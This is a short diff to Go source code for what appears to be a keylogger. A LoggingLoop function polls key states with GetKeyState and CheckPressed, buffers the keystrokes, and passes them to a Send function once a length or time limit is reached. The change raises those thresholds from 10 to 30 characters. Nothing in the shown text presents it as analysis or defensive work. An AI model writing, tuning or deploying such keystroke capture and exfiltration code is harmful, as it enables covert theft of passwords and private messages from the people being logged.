@@ -203,7 +203,7 @@ func LoggingLoop() {
 		s = ""
 		GetKeyState(inputs)
 		CheckPressed(&s, inputs, prev)
-		if len(buffer.String()) <= 10 {
+		if len(buffer.String()) <= 30 {
 			buffer.WriteString(s)
 		} else {
 			buffer.WriteString("\n")
@@ -215,7 +215,7 @@ func LoggingLoop() {
 
 		ending := time.Now()
 		duration := ending.Sub(begin)
-		if len(total_string) >= 10 || duration.Minutes() > 1 {
+		if len(total_string) >= 30 || duration.Minutes() > 1 {
 			if len(total_string) != 0 {
 				Send(total_string)
 			}
